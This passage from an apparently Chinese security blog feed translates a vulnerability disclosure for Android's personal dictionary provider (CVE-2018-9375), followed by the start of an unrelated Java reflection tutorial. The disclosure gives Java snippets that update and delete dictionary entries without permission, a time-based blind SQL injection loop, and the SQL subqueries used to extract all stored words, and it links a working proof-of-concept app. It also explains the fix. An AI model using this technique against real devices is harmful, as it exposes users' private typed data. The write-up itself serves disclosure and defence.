       <span style="color:#a6e22e">android:backupAgent=</span><span style="color:#e6db74">&#34;DictionaryBackupAgent&#34;</span>
       <span style="color:#a6e22e">android:killAfterRestore=</span><span style="color:#e6db74">&#34;false&#34;</span>
       <span style="color:#a6e22e">android:usesCleartextTraffic=</span><span style="color:#e6db74">&#34;false&#34;</span>
       <span style="color:#f92672">&gt;</span>

       <span style="color:#f92672">&lt;provider</span> <span style="color:#a6e22e">android:name=</span><span style="color:#e6db74">&#34;UserDictionaryProvider&#34;</span>      <span style="color:#960050;background-color:#1e0010">//&#34;UserDictionaryProvider&#34;</span>
          <span style="color:#a6e22e">android:authorities=</span><span style="color:#e6db74">&#34;user_dictionary&#34;</span>
          <span style="color:#a6e22e">android:syncable=</span><span style="color:#e6db74">&#34;false&#34;</span>
          <span style="color:#a6e22e">android:multiprocess=</span><span style="color:#e6db74">&#34;false&#34;</span>
          <span style="color:#a6e22e">android:exported=</span><span style="color:#e6db74">&#34;true&#34;</span> <span style="color:#f92672">/&gt;</span>                     //android:exported=&#34;true&#34;

   <span style="color:#f92672">&lt;/application&gt;</span>
<span style="color:#f92672">&lt;/manifest&gt;</span>
</code></pre></div><p>攻击者只需从任何恶意应用程序调用如下代码，就可以更新用户字典的内容，而无需请求任何许可：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">ContentValues values <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ContentValues<span style="color:#f92672">();</span>
values<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>UserDictionary<span style="color:#f92672">.</span><span style="color:#a6e22e">Words</span><span style="color:#f92672">.</span><span style="color:#a6e22e">WORD</span><span style="color:#f92672">,</span> <span style="color:#e6db74">&#34;IOActive&#34;</span><span style="color:#f92672">);</span>

getContentResolver<span style="color:#f92672">().</span><span style="color:#a6e22e">update</span><span style="color:#f92672">(</span>UserDictionary<span style="color:#f92672">.</span><span style="color:#a6e22e">Words</span><span style="color:#f92672">.</span><span style="color:#a6e22e">CONTENT_URI</span><span style="color:#f92672">,</span> values<span style="color:#f92672">,</span>
        <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>
</code></pre></div><p>删除任何内容，包括整个个人字典也很简单：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">getContentResolver<span style="color:#f92672">().</span><span style="color:#a6e22e">delete</span><span style="color:#f92672">(</span>UserDictionary<span style="color:#f92672">.</span><span style="color:#a6e22e">Words</span><span style="color:#f92672">.</span><span style="color:#a6e22e">CONTENT_URI</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span> 
</code></pre></div><p>这两种方法(<code>update</code> 和<code>delete</code>) 都应该返回受影响的行数，但是在这种情况下(对于非法的调用) 总是返回零，这使得攻击者更难从内容提供者提取或推断出任何信息。</p>
<p>在这一点上，从攻击者者的角度来看，这可能是我们所能做的全部。虽然删除或更新任意条目可能会给最终用户带来麻烦，但最有趣的部分是访问个人数据。</p>
<p>即使查询功能没有受到这个功能的直接影响，但仍然可以通过利用基于时间的侧通道攻击来转储整个内容。 由于攻击者完全可控<code>where</code>参数，并且由于任何行的成功更新比不影响任何行的同一语句需要更多时间来执行，所以下面描述的攻击被证明是有效的。</p>
<h3 id="简单的poc">简单的PoC</h3>
<p>考虑从恶意应用程序运行以下代码片段:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">ContentValues values <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> ContentValues<span style="color:#f92672">();</span>
values<span style="color:#f92672">.</span><span style="color:#a6e22e">put</span><span style="color:#f92672">(</span>UserDictionary<span style="color:#f92672">.</span><span style="color:#a6e22e">Words</span><span style="color:#f92672">.</span><span style="color:#a6e22e">_ID</span><span style="color:#f92672">,</span> 1<span style="color:#f92672">);</span>

<span style="color:#66d9ef">long</span> t0 <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">nanoTime</span><span style="color:#f92672">();</span>
<span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span><span style="color:#66d9ef">int</span> i<span style="color:#f92672">=</span>0<span style="color:#f92672">;</span> i<span style="color:#f92672">&lt;</span>200<span style="color:#f92672">;</span> i<span style="color:#f92672">++)</span> <span style="color:#f92672">{</span>
    getContentResolver<span style="color:#f92672">().</span><span style="color:#a6e22e">update</span><span style="color:#f92672">(</span>UserDictionary<span style="color:#f92672">.</span><span style="color:#a6e22e">Words</span><span style="color:#f92672">.</span><span style="color:#a6e22e">CONTENT_URI</span><span style="color:#f92672">,</span> values<span style="color:#f92672">,</span>
                    <span style="color:#e6db74">&#34;_id = 1 AND word LIKE &#39;a%&#39;&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">null</span><span style="color:#f92672">);</span>         <span style="color:#75715e">//AND word LIKE &#39;a%&#39;&#34;
</span><span style="color:#75715e"></span><span style="color:#f92672">}</span>
<span style="color:#66d9ef">long</span> t1 <span style="color:#f92672">=</span> System<span style="color:#f92672">.</span><span style="color:#a6e22e">nanoTime</span><span style="color:#f92672">();</span>
</code></pre></div><p>多次调用相同的语句（比如200次，取决于设备），计算为“true”的SQL条件与计算为“false”的条件之间的时间差(t1-t0)结果将是显而易见的,这将允许攻击者通过利用一个典型的基于时间的布尔盲注Sql注入攻击来提取出受影响数据库中的所有信息。</p>
<p>因此，如果字典中的第一个用户自定义的单词以字母“a”开头，这个条件将被评估为“true”，上面的代码片段将需要更多的时间来执行（比如5秒），而当猜测为假时所需的时间较短(比如2秒)。因为在这种情况下，没有任何一行会被更新。如果猜错了，我们可以用“b”，“c”，等等。 如果猜测是正确的，就意味着我们知道单词的第一个字符，所以我们可以使用相同的方法来猜测第二个字符。然后我们可以移到下一个单词，以此类推，直到我们转储整个字典或任何可过滤的行和字段子集。</p>
<p>为了避免更改数据库的内容，请注意我们如何更新检索到的单词的“id”列，以匹配它的原始值，因此内部幂等语句将如下所示：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">UPDATE</span> words <span style="color:#66d9ef">SET</span> _id<span style="color:#f92672">=</span>N <span style="color:#66d9ef">WHERE</span> _id<span style="color:#f92672">=</span>N <span style="color:#66d9ef">AND</span> (condition)
</code></pre></div><p>如果条件为真，那么带有标识符“N”的行会将以一种不会改变其标识符的方式进行更新，因为它将被设置为其原始值，而行则保持不变。这是一种非侵入性的方法，使用执行时间作为侧通道oracle来提取数据。</p>
<p>因为我们可以用任何子SELECT语句替换上面的条件，所以这种攻击可以扩展到查询SQLite中支持的任何SQL表达式，例如：</p>
<ul>
<li>&lsquo;something'这个词存储在字典里吗？</li>
<li>检索所有16个字符的单词（如信用卡号）</li>
<li>检索所有有快捷方式的单词</li>
<li>检索包含一个点的所有单词</li>
</ul>
<h3 id="真实的利用">真实的利用</h3>
<p>上面描述的过程可以完全自动化和优化。我开发了一个简单的Android应用程序来证明它的可利用性并测试它的有效性。</p>
<p>PoC应用程序基于这样的假设：我们可以通过上述的内容提供者盲目地更新<code>UserDictionary </code>数据库中的任意行。 如果内部更新语句影响一或多行，则需要更多的时间来执行。 这基本上是我们所需要的，以便推断以SQL条件形式的假设是否被评估为true或false。</p>
<p>但是，由于在这个初始阶段，我们没有任何关于内容的信息(甚至没有内部标识符的值)，而不是遍历所有可能的标识符值，我们将从具有最低标识符的行开始， 并将其“frequency”字段的原始值粉碎为任意数字。这个步骤可以使用不同的有效方法来完成。</p>
<p>由于多个共享进程将同时在Android上运行，因此相同调用的总运行时间会因不同的执行而有所不同。此外，执行时间还决于每个设备的处理能力和性能。然而，从统计的角度来看，重复相同的调用，大量的迭代应该给我们一个平均的可微度量。 这就是为什么我们需要调整每个设备和当前配置的迭代次数（例如，在省电模式下）。</p>
<p>尽管我尝试了一种更复杂的方法来确定响应时间是否应该被解释成真或假，但我最终实现了一种更简单的方法，从而获得了准确和可靠的结果。 只要计算相同数量的总是为“true”请求（e.g. “<code>WHERE 1=1</code>”) 和总是为”false&quot;的请求(e.g. “<code>WHERE 1=0</code>”)  ，并以平均时间作为临界值来区分它们。比临界值更大的测量时间将被解释为真; 反之为假。这不是人工智能或大数据，也不是使用区块链或云计算，而是 K.I.S.S. 原理适用并有效！</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212145.png" alt=""></p>
<p>一旦我们有了区分正确和错误假设的方法，那么转储整个数据库就变得轻而易举了。前一节中描述的示例很容易理解，但它并不是最有效的提取信息的方法。 在我们的PoC中，我们将使用二分查找算法[4]来代替任何数字查询，使用以下简单的方法：</p>
<ul>
<li>确定表的行数（可选）
<ul>
<li><code>SELECT COUNT(*) FROM words</code></li>
</ul>
</li>
<li>确定最低的标识符
<ul>
<li><code>SELECT MIN(_id) FROM words</code></li>
</ul>
</li>
<li>使用该标识符确定单词的字符数。
<ul>
<li><code>SELECT length(word) FROM words WHERE _id=N</code></li>
</ul>
</li>
<li>遍历该单词，通过字符提取字符（在字符/unicode中）
<ul>
<li><code>SELECT unicode(substr(word, i, 1)) FROM words WHERE _id=N</code></li>
</ul>
</li>
<li>确定比我们得到的标识符大的最低标识符，并重复</li>
<li><code>SELECT MIN(_id) FROM words WHERE _id &gt; N</code></li>
</ul>
<p>请记住，我们不能直接检索任何数字或字符串值，因此我们需要将这些表达式转换为一组布尔查询，这些查询可以根据它们的执行时间计算为true或false。这就是二分查找算法的工作原理。我们不会直接查询一个数字，而是反复查询：它是否大于X？”，在每次迭代中调整X的值，直到在log(n)查询后找到正确的值为止。例如，如果检索的当前值是97，那么该算法的执行跟踪将如下所示：</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212208.png" alt=""></p>
<h3 id="poc利用工具">PoC利用工具</h3>
<p>上面描述的过程是在PoC工具中实现的，如下所示 。这个PoC的源代码和编译的APK可以从下面的GitHub存储库找到： <a href="https://github.com/IOActive/AOSP-ExploitUserDictionary">https://github.com/IOActive/AOSP-ExploitUserDictionary</a></p>
<p>让我们看看它的极简用户界面，并解释它的特性。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212218.png" alt=""></p>
<p>应用程序做的第一件事是尝试直接访问个人字典内容提供者，查询条目的数量。在正常情况下（不是作为root运行，等等），我们不应该有访问权限。 如果出于任何原因我们实现了直接访问，使用基于时间的盲注方法来利用任何东西是没有意义的，但是即使在这种情况下，我们也欢迎您将CPU运行浪费在这个PoC上，而不是挖掘加密货币。</p>
<p>如前所述，只有两个参数需要调整：</p>
<ul>
<li><strong>Initial number of iterations</strong> （初始迭代次数）：有多少次相同的调用会被重复以获得显著的时间差。</li>
<li><strong>Minimum time threshold</strong> （最短时间临界值，以毫秒为单位）：多少时间将被视为可接受的最低值。</li>
</ul>
<p>虽然该工具的当前版本将自动调整它们，但在第一阶段，一切都是手动的，工具只是提供这些参数，因此这就是存在这些控制的原因之一。</p>
<p>从理论上讲，这些数字越大，我们得到的精确度就越高，但提取的速度会更慢。如果它们更小，它将运行得更快，但它更有可能获得不准确的结果。这就是为什么存在最少10次迭代和200毫秒的硬编码。</p>
<p>如果我们按下“开始”按钮，应用程序将启动参数的自动调整。首先，它将运行一些查询并丢弃结果，因为最初的查询通常比较高且不具有代表性。然后，它将执行初始的迭代次数并估计相应的临界值。如果获得的临界值超过了我们配置的最小值，那么它将运行20个连续的查询，交替执行true和false语句来测试估计的准确性。 如果准确度较差（只允许一个错误），然后，它将增加迭代次数，并按设定的次数重复处理，直到参数被适当调整，或者在条件不能满足时放弃和退出。</p>
<p>一旦进程启动，一些控件将被禁用，我们将在下面的可滚动日志窗口(也通过logcat)中看到当前详细的输出，在其中我们可以看到当前行标识符、所有SQL子查询、总时间和推断的真实性。检索到的字符将在提取后立即出现在上面一行中。</p>
<p><img src="http://my-md-1253484710.coscd.myqcloud.com/20180805212230.png" alt=""></p>
<p>最后，右边的“UPD&quot;和DEL&quot;按钮与基于时间的提取控件完全无关，他们只是简单地实现对内容提供者的直接调用，分别执行更新和删除操作。它们被有意地限制在只以“123”开头的单词。这样做是为了避免任何个人字典的意外删除，因此为了测试这些方法，我们需要手动添加这个条目，除非我们已经有了。</p>
<h3 id="demo">Demo</h3>
<p>总结这个过程的最简单的方法可能是在下面的视频中观看工具的动作，记录在一个真正的设备中。(可能无法观看)</p>
<p><a href="http://www.youtube.com/watch?v=8i-oMcaJw40"><img src="http://img.youtube.com/vi/8i-oMcaJw40/0.jpg" alt="IMAGE ALT TEXT HERE"></a></p>
<p><a href="http://www.youtube.com/watch?v=VQf-INNTKKU"><img src="http://img.youtube.com/vi/VQf-INNTKKU/0.jpg" alt="IMAGE ALT TEXT HERE"></a></p>
<h3 id="额外的注意事项">额外的注意事项</h3>
<p>理论和实践之间通常存在差距，所以我也想在这个PoC的设计和开发过程中分享我遇到的一些问题。 首先，请记住，该工具只是一个快速和肮脏的PoC。 它的主要目标是证明利用是可行的，并且可以直接实现，这就是为什么它有一些限制并且不遵循推荐的编程最佳实践，因为它不意味着可维护，高效，提供良好的用户体验，等等。</p>
<p>在初始阶段，我并不关心UI，一切消息都被转储到Android日志输出中。当我决定在GUI中显示结果时，我不得不在一个单独的线程中运行所有的代码，以避免阻塞UI线程  (这可能会导致应用程序被认为是无响应的因此被操作系统杀死）。由于这个简单的更改，精确度大大下降，因为线程没有太高的优先级，所以我将其设置为“-20”，这是允许的最大优先级，之后一切都恢复正常工作了。</p>
<p>从一个单独的线程更新UI可能会导致崩溃，通常会通过运行时异常来检测和限制，因此为了显示日志消息，我不得不使用对 <code>runOnUiThread</code> 的调用来调用它们。请记住，在实际的利用中，根本不需要UI。</p>
<p>如果个人字典为空，则不能使用任何行去强制更新，因此所有查询的执行时间大致相同。在这种情况下，将没有任何东西可以提取，工具也不会调整参数，最终会停止运行。在一些奇怪的情况下，它可能会被随机地校准，即使是空的数据库，它也会尝试提取垃圾或伪随机数据。</p>
<p>在常规的智能手机中，操作系统会在一段时间后进入睡眠模式，性能会大幅下降，导致执行时间超过预期值，因此所有的调用都将被评估为true。这可以被检测到并以不同的方式做出反应，但我只是选择了一个更简单的解决方案：我一直打开屏幕，并通过电源管理器获得一个唤醒锁，以防止操作系统挂起应用程序。 之后我没有费心去释放它，所以如果您不使用，您必须得关闭应用程序。</p>
<p>旋转屏幕也会引起问题，因此，我将它强制设置为横向模式，以避免自动旋转，并利用额外的宽度来显示每条消息。</p>
<p>一旦你按下“开始”按钮，一些控件将被永久禁用。如果您想要重新调整参数或多次运行它，您需要关闭它并重新打开它。</p>
<p>一些外部事件和并行执行（例如同步电子邮件或接收推送消息) 可能会干扰应用程序的行为，可能会导致不准确的结果。如果发生这种情况，请在更稳定的条件下再试一次，比如禁用对网络的访问或关闭所有其他应用程序。</p>
<p>UI不支持国际化，它不是为了在Unicode中提取单词而设计的（尽管它应该是微不足道的，但它并不是我的目标，这只是简单的一个PoC）。</p>
<p>它被有意地限制为只提取前5个单词，并根据它们的内部标识进行排序。</p>
<h3 id="修复">修复</h3>
<p>从源代码的角度来看，修复非常简单。只要移动调用来检查调用者是否拥有受影响函数开始的权限，就足以解决这个问题。除了这个建议之外，我们还向Google提供了一个补丁文件，其中包含了建议的修复程序，这是他们修复漏洞的公告：</p>
<p><a href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6">https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/cccf7d5c98fc81ff4483f921fb4ebfa974add9c6</a></p>
<p>由于这个问题已经在官方存储库中被修复了，作为用户，我们必须确保我们当前安装的安全补丁级别包含CVE-2018-9375的补丁。例如，在Google pixel/nexus中，它于2018年6月发布：</p>
<p><a href="https://source.android.com/security/bulletin/pixel/2018-06-01">https://source.android.com/security/bulletin/pixel/2018-06-01</a></p>
<p>如果由于任何原因，不能对您的设备进行更新，考虑检查您的个人字典的内容，并确保它不包含任何敏感信息，在不太可能的事件中，这个问题将被积极地利用。</p>
<h3 id="总结">总结</h3>
<p>软件开发是困难的。一个错误的行可能导致不良的结果。一项旨在提高用户个人词典的安全性和保护的改变导致了相反的结果，因为它无意中允许访问，而不需要任何特定的许可，并且在近3年的时间里没有被注意到。</p>
<p>识别像这里描述的那样的漏洞可以像阅读和理解源代码一样简单，只需遵循执行流程即可。自动化测试可能有助于在早期发现这类问题，并防止它们在进一步的更改中再次发生，但是它们并不总是那么容易实现和维护。</p>
<p>我们还学会了如何从一个漏洞中得到最大的好处，这个漏洞原则上只允许我们盲目地破坏或篡改数据，从而增加了它对信息披露的最终影响，而信息泄露是利用一个侧信道、基于时间的攻击来泄露所有数据。</p>
<p>要学会跳出固有思维去思考一件事，记住：时间是最有价值的资源之一。每秒都值千金!</p>
<p>[1] <a href="https://developer.android.com/reference/android/provider/UserDictionary">https://developer.android.com/reference/android/provider/UserDictionary</a>
[2] Gerrit’s Change-Id: I6c5716d4d6ea9d5f55a71b6268d34f4faa3ac043
<a href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/e0e0e0c9b27e10f7e33c371c490fdae8b634f117">https://android.googlesource.com/platform/packages/providers/…</a>
[3]At the time of discovery, it was found in the AOSP master branch:
<a href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/master/src/com/android/providers/userdictionary/UserDictionaryProvider.java">https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…</a>
After the fix, the equivalent contents can be found in the following commit:
<a href="https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/+/0272515f306cf7f12d2babe03d625850990a00c1/src/com/android/providers/userdictionary/UserDictionaryProvider.java">https://android.googlesource.com/platform/packages/providers/UserDictionaryProvider/…</a>
[4 ]<a href="https://en.wikipedia.org/wiki/Binary_search_algorithm">https://en.wikipedia.org/wiki/Binary_search_algorithm</a></p>
<blockquote>
<p>[原文：<a href="https://ioactive.com/discovering-and-exploiting-a-vulnerability-in-androids-personal-dictionary/">Discovering and Exploiting a Vulnerability in Android’s Personal Dictionary (CVE-2018-9375)</a></p>
</blockquote>
]]></content>
        </item>
        
        <item>
            <title>Java反射机制学习笔记</title>
            <link>https://kuekiko.top/posts/2018/07/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</link>
            <pubDate>Wed, 25 Jul 2018 16:40:20 +0800</pubDate>
            
            <guid>https://kuekiko.top/posts/2018/07/java%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</guid>
            <description>Java 反射机制学习记录 在逆向中反射也是能经常看见，之前理解不是很深透，现在来重点学习一下，做个笔记。
什么是反射机制？ 反射(Reflection)是Java 程序开发语言的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。 通俗一点：在动态运行时，获取到一个类的所有方法以及成员。简而言之，通过反射，我们可以在运行时获得程序或程序集中每一个类型的成员和成员的信息。
作用？  1.在运行时判断任意一个对象所属的类； 2.在运行时构造任意一个类的对象； 3.在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）； 4.在运行时调用任意一个对象的方法  是运行时而不是编译时  获取某些类的一些变量，调用某些类的私有方法。 增加代码的灵活性。很多主流框架都使用了反射技术.像ssh框架都采用两种技术 xml做配置文件+反射技术.  基本使用 反射相关的类一般都在java.lang.relfect 包里。
  获取Class对象 3种方法
(1)使用Class类的forName静态方法:
public static Class&amp;lt;?&amp;gt; forName(String className)//在JDBC开发中常用此方法加载数据库驱动:Class.forName(driver);(2)直接获取某一个对象的class，比如:
Class&amp;lt;?&amp;gt; klass = int.class;Class&amp;lt;?&amp;gt; classInt = Integer.TYPE;(3)调用某个对象的getClass()方法,比如:
StringBuilder str = new StringBuilder(&amp;#34;123&amp;#34;);Class&amp;lt;?&amp;gt; klass = str.getClass();  判断是否为某一个类的实例
一般使用instanceof来判断，也可以借助反射中的Class对象的isInstance()方法来判断 是一个Native方法：
public native boolean isInstance(Object obj);  创建实例
通过放射来生成对象两种方式：</description>
            <content type="html"><![CDATA[<h2 id="java-反射机制学习记录">Java 反射机制学习记录</h2>
<p>在逆向中反射也是能经常看见，之前理解不是很深透，现在来重点学习一下，做个笔记。</p>
<h3 id="什么是反射机制">什么是反射机制？</h3>
<p>反射(Reflection)是Java 程序开发语言的特征之一，它允许运行中的 Java 程序获取自身的信息，并且可以操作类或对象的内部属性。 通俗一点：在动态运行时，获取到一个类的所有方法以及成员。简而言之，通过反射，我们可以在<strong>运行时</strong>获得程序或程序集中每一个类型的成员和成员的信息。</p>
<h3 id="作用">作用？</h3>
<ul>
<li>1.在运行时判断任意一个对象所属的类；</li>
<li>2.在运行时构造任意一个类的对象；</li>
<li>3.在运行时判断任意一个类所具有的成员变量和方法（通过反射甚至可以调用private方法）；</li>
<li>4.在运行时调用任意一个对象的方法</li>
</ul>
<h5 id="是运行时而不是编译时"><strong>是运行时而不是编译时</strong></h5>
<ul>
<li>获取某些类的一些变量，调用某些类的私有方法。</li>
<li>增加代码的灵活性。很多主流框架都使用了反射技术.像ssh框架都采用两种技术 xml做配置文件+反射技术.</li>
</ul>
<h3 id="基本使用">基本使用</h3>
<p>反射相关的类一般都在java.lang.relfect 包里。</p>
<ol>
<li>
<p>获取Class对象 3种方法</p>
<p>(1)使用Class类的forName静态方法:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> Class<span style="color:#f92672">&lt;?&gt;</span> forName<span style="color:#f92672">(</span>String className<span style="color:#f92672">)</span>
<span style="color:#75715e">//在JDBC开发中常用此方法加载数据库驱动:
</span><span style="color:#75715e"></span>Class<span style="color:#f92672">.</span><span style="color:#a6e22e">forName</span><span style="color:#f92672">(</span>driver<span style="color:#f92672">);</span>
</code></pre></div><p>(2)直接获取某一个对象的class，比如:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">Class<span style="color:#f92672">&lt;?&gt;</span> klass <span style="color:#f92672">=</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">;</span>
Class<span style="color:#f92672">&lt;?&gt;</span> classInt <span style="color:#f92672">=</span> Integer<span style="color:#f92672">.</span><span style="color:#a6e22e">TYPE</span><span style="color:#f92672">;</span>
</code></pre></div><p>(3)调用某个对象的getClass()方法,比如:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java">StringBuilder str <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> StringBuilder<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;123&#34;</span><span style="color:#f92672">);</span>
Class<span style="color:#f92672">&lt;?&gt;</span> klass <span style="color:#f92672">=</span> str<span style="color:#f92672">.</span><span style="color:#a6e22e">getClass</span><span style="color:#f92672">();</span>
</code></pre></div></li>
<li>
<p>判断是否为某一个类的实例</p>
<p>一般使用instanceof来判断，也可以借助反射中的Class对象的isInstance()方法来判断  是一个Native方法：</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">native</span> <span style="color:#66d9ef">boolean</span> <span style="color:#a6e22e">isInstance</span><span style="color:#f92672">(</span>Object obj<span style="color:#f92672">);</span>
</code></pre></div></li>
<li>
<p>创建实例</p>
<p>通过放射来生成对象两种方式：</p>
<p>（1）使用Class对象的newInstance()方法来创建Class对象对应类的实例。</p>
<pre><code>Class&lt;?&gt; c = String.class;
Object str = c.newInstance();
</code></pre><p>（2）先通过Class对象获取指定的Constructor对象，再调用Constructor对象的newInstance()方法来创建实例。这种方法可以用指定的构造器构造类的实例。</p>
<pre><code>//获取String所对应的Class对象
Class&lt;?&gt; c = String.class;
//获取String类带一个String参数的构造器
Constructor constructor = c.getConstructor(String.class);
//根据构造器创建实例
Object obj = constructor.newInstance(&quot;23333&quot;);
System.out.println(obj);
</code></pre></li>
<li>
<p>获取方法</p>
<p>getDeclaredMethods()方法返回类或接口声明的所有方法，包括公共、保护、默认（包）访问和私有方法，但不包括继承的方法。</p>
<pre><code>public Method[] getDeclaredMethods() throws SecurityException
</code></pre><p>getMethods()方法返回某个类的所有公用（public）方法，包括其继承类的公用方法。</p>
<pre><code>public Method[] getMethods() throws SecurityException
</code></pre><p>getMethod方法返回一个特定的方法，其中第一个参数为方法名称，后面的参数为方法的参数对应Class的对象</p>
<pre><code>public Method getMethod(String name, Class&lt;?&gt;... parameterTypes)
</code></pre></li>
</ol>
<p>eg:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-java" data-lang="java"><span style="color:#f92672">import</span> java.lang.reflect.InvocationTargetException<span style="color:#f92672">;</span>
<span style="color:#f92672">import</span> java.lang.reflect.Method<span style="color:#f92672">;</span>


<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">class</span> <span style="color:#a6e22e">test</span> <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">test1</span><span style="color:#f92672">()</span> <span style="color:#66d9ef">throws</span> IllegalAccessException<span style="color:#f92672">,</span> InstantiationException<span style="color:#f92672">,</span>
            NoSuchMethodException<span style="color:#f92672">,</span> InvocationTargetException <span style="color:#f92672">{</span>
        Class<span style="color:#f92672">&lt;?&gt;</span> c <span style="color:#f92672">=</span> methodClass<span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">;</span>
        Object object <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">newInstance</span><span style="color:#f92672">();</span>
        Method<span style="color:#f92672">[]</span> methods <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">getMethods</span><span style="color:#f92672">();</span>
        Method<span style="color:#f92672">[]</span> declaredMethods <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">getDeclaredMethods</span><span style="color:#f92672">();</span>
        Method method <span style="color:#f92672">=</span> c<span style="color:#f92672">.</span><span style="color:#a6e22e">getMethod</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;add&#34;</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">,</span> <span style="color:#66d9ef">int</span><span style="color:#f92672">.</span><span style="color:#a6e22e">class</span><span style="color:#f92672">);</span> <span style="color:#75715e">//获取add方法
</span><span style="color:#75715e"></span>        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getMethods获取的方法：&#34;</span><span style="color:#f92672">);</span>
        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Method m <span style="color:#f92672">:</span> methods<span style="color:#f92672">)</span>
            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>m<span style="color:#f92672">);</span>
        System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span><span style="color:#e6db74">&#34;getDeclaredMethods获取的方法：&#34;</span><span style="color:#f92672">);</span>
        <span style="color:#66d9ef">for</span> <span style="color:#f92672">(</span>Method m <span style="color:#f92672">:</span> declaredMethods<span style="color:#f92672">)</span>
            System<span style="color:#f92672">.</span><span style="color:#a6e22e">out</span><span style="color:#f92672">.</span><span style="color:#a6e22e">println</span><span style="color:#f92672">(</span>m<span style="color:#f92672">);</span>
    <span style="color:#f92672">}</span>

    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">static</span> <span style="color:#66d9ef">void</span> <span style="color:#a6e22e">main</span><span style="color:#f92672">(</span>String<span style="color:#f92672">[]</span> args<span style="color:#f92672">)</span> <span style="color:#f92672">{</span>
        <span style="color:#66d9ef">try</span><span style="color:#f92672">{</span>
            test1<span style="color:#f92672">();</span>

        <span style="color:#f92672">}</span><span style="color:#66d9ef">catch</span> <span style="color:#f92672">(</span>Exception e<span style="color:#f92672">){</span>
            e<span style="color:#f92672">.</span><span style="color:#a6e22e">printStackTrace</span><span style="color:#f92672">();</span>
        <span style="color:#f92672">}</span>

    <span style="color:#f92672">}</span>
<span style="color:#f92672">}</span>

<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">methodClass</span> <span style="color:#f92672">{</span>
    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">final</span> <span style="color:#66d9ef">int</span> fuck <span style="color:#f92672">=</span> 3<span style="color:#f92672">;</span>
